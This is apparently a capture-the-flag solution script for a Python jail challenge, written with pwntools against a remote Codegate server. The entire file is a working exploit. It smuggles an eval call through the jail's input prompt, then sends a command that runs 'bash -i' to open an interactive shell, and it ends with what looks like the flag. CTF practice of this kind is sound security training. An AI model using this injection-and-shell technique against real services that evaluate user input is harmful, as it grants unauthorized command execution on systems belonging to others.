#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = remote("ch41l3ng3s.codegate.kr", 2014)
r.sendlineafter("Name : ", "GG")
r.sendlineafter("###############################################\n", "dig()and eval(sys.stdin.readline())")
r.sendline("__import__('os').system('bash -i')")
r.interactive()

# Pyth0n J@il escape 1s always fun @nd exc1ting ! :)
